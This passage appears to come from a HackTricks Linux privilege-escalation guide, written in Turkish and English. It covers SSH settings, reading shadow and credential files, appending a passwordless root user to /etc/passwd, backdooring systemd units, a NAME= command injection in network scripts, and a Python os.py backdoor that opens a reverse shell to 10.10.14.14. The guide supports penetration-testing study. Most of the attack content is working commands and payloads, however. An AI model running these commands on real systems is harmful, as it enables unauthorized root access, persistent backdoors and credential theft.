- **PubkeyAuthentication:** Public key doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola doğrulaması izinliyse, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`. Olası değerler:

- `yes`: root parola ve private key kullanarak giriş yapabilir
- `without-password` or `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: root sadece private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : izin verilmez

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bu token kullanıcı ev dizini ile değiştirilecektir. **Mutlak yollar belirtebilirsiniz** (`/` ile başlayan) veya **kullanıcının evinden göreli yollar**. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, kullanıcı "**testusername**" için **private** anahtarıyla giriş yapmayı denediğinizde ssh'in anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) anahtarlar bırakmak yerine yerel SSH keys'inizi kullanmanıza izin verir. Böylece ssh ile bir host'a jump edebilir ve oradan başlangıç host'unuzda bulunan key'i kullanarak başka bir host'a jump edebilirsiniz.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Dikkat: `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecek (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmayı izin verip engelleyebilir.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesiyle ssh-agent yönlendirmesine **izin verebilir** veya **engelleyebilir** (varsayılan: izin verilir).

Eğer bir ortamda Forward Agent yapılandırıldığını görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu ayrıcalık yükseltmek için kötüye kullanma imkanınız olabilir**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Dosya `/etc/profile` ile `/etc/profile.d/` altındaki dosyalar **kullanıcı yeni bir shell başlattığında çalıştırılan scriptlerdir**. Dolayısıyla, bunlardan herhangi birini **yazabiliyor veya değiştirebiliyorsanız ayrıcalık yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer herhangi bir tuhaf profile script bulunursa, **hassas bilgiler** için kontrol edin.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim kullanıyor veya bir yedeği olabilir. Bu nedenle **tümünü bulun** ve **okuyup okuyamadığınızı kontrol edin**, dosyaların içinde **hashes** olup olmadığını görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyasının içinde **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Önce, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz.

Alternatif olarak, aşağıdaki satırları parola olmadan sahte bir kullanıcı eklemek için kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini azaltabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı **hassas dosyalara yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **modify the Tomcat service configuration file inside /etc/systemd/,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacak.

### Klasörleri Kontrol Edin

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama yine de deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son dakikalarda değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries PATH'te**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bilinen passwords içeren dosyalar

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it searches for **several possible files that could contain passwords**.\
**Başka ilginç bir araç** olarak kullanabileceğiniz: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) which is an açık kaynak uygulama used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.

### Loglar

Logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, o kadar ilginç olur (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logs** audit loglarına **passwords** kaydedilmesine izin verebilir; bunun nasıl yapıldığı bu yazıda açıklanıyor: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Günlükleri okumak için [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu çok yardımcı olacaktır.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosya **adında** veya **içeriğinde** "**password**" kelimesini içeren dosyaları kontrol etmelisiniz, ayrıca log'larda IPs ve emails ile hashes regexps'leri de kontrol edin.\ Burada tüm bunların nasıl yapılacağını listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya **modify python libraries** yapabiliyorsanız, os kütüphanesini değiştirip backdoorlayabilirsiniz (eğer python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

`logrotate`'deki bir zafiyet, bir günlük dosyası veya üst dizinlerinde **yazma izinleri** olan kullanıcıların potansiyel olarak ayrıcalık yükseltmesi elde etmesine izin verir. Çünkü `logrotate`, genellikle **root** olarak çalışan, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaların çalıştırılmasına neden olacak şekilde manipüle edilebilir. İzinleri yalnızca _/var/log_ içinde değil, log rotasyonunun uygulandığı herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürümü `3.18.0` ve öncekilerini etkiler

Zafiyet hakkında daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** ile çok benzerdir; bu yüzden günlükleri değiştirebildiğinizi her keşfettiğinizde, bu günlükleri kimin yönettiğini kontrol edin ve günlükleri symlinks ile değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi inceleyin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine **write** izinleriyle bir `ifcf-<whatever>` script yazabiliyorsa **veya** mevcut bir script'i **adjust** edebiliyorsa, o zaman **sisteminiz pwned** olur.

Network script'leri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. .INI dosyalarına tıpatıp benzer görünürler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network script'lerinde `NAME=` ile atanan değer düzgün şekilde işlenmiyor. Eğer isimde **white/blank space** varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor. Bu da demek oluyor ki **ilk boşluktan sonraki her şey root olarak çalıştırılıyor**.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id_ arasındaki boşluğu unutmayın_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, System V init (SysVinit) için **scripts**'lerin bulunduğu yerdir; **klasik Linux servis yönetim sistemi**'dir. Servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için scriptler içerir. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`'dir.

Diğer tarafta, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından getirilen daha yeni bir **servis yönetimi** olup servis yönetimi görevleri için konfigürasyon dosyaları kullanır. Upstart'e geçişe rağmen, Upstart içindeki bir uyumluluk katmanı nedeniyle SysVinit scriptleri Upstart konfigürasyonlarıyla birlikte kullanılmaya devam eder.

**systemd** modern bir initialization ve servis yöneticisi olarak öne çıkar; isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumunun anlık görüntülerini alma gibi gelişmiş özellikler sunar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında düzenleyerek sistem yönetimini kolaylaştırır.

## Diğer Hileler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle privileged kernel fonksiyonelliğini userspace bir manager'a açmak için bir syscall'u hook'lar. Zayıf manager authentication (ör. FD-order'a dayalı signature kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten-root'lu cihazlarda root'a yükseltmesine olanak sağlayabilir. Daha fazla bilgi ve exploitation detayları için:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex-driven service discovery, process komut satırlarından bir binary path çıkarıp bunu -v ile yetkili bir context altında çalıştırabilir. İzin verici pattern'ler (ör. \S kullanımı) yazılabilir lokasyonlarda (ör. /tmp/httpd) attacker tarafından yerleştirilmiş listener'ları eşleyebilir ve bu da root olarak çalıştırmaya yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgi ve diğer discovery/monitoring yığınlarına uygulanabilecek genelleştirilmiş paterni görmek için:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux yerel privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
